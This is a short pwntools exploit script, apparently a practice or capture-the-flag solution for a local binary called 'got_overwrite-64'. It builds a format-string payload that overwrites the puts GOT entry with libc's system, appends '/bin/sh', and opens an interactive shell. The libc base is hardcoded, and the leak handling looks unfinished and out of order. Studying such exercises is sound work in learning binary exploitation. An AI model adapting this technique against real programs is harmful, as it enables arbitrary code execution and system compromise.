from pwn import * 

elf = context.binary = ELF('./got_overwrite-64')

io = elf.process()
libc = elf.libc

libc.address = 0x7ffff7dcd000 

print(hex(elf.got['printf']))

print(hex(elf.got['puts']))


payload = fmtstr_payload(6,{elf.got['puts'] : libc.sym['system']})

io.sendline(p64(elf.got['puts']))
leak = io.recvline()
leak = int(leak,16)
print("leak : " , hex(leak))



payload += b'/bin/sh'
gdb.attach(io)
#io.sendline('/bin/sh')
io.sendline(payload)
io.clean()
io.interactive()